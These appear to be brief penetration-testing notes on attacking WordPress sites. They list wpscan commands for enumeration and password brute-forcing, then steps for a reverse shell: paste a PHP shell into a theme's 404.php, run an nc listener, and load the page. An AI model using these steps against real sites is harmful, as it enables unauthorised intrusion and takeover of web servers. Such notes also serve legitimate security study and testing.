### wpscan 

#### Scan
- wpscan --url https://[target_ip]
#### Vulnerable Plugins
- wpscan --url http://[victim_ip] --enumerate vp
#### Vulnerable Themes
- wpscan --url http://[victim_ip] --enumerate vt
#### Enumerate Users
- wpscan -u http://[victim_ip] --enumerate u
#### Password Bruteforce
- wpscan -u http://[victim_ip] --wordlist file.txt threads 50

#### ReverseShell via thames

1)Log_in
2)Side menu
3)Appearance
  - Editor
  - 404.php
  - paste php reverse shell
4)run nc -lnvp [ip]

5)Open /wp-content/themes/twentyfiftee(change for your thames name)/404.php


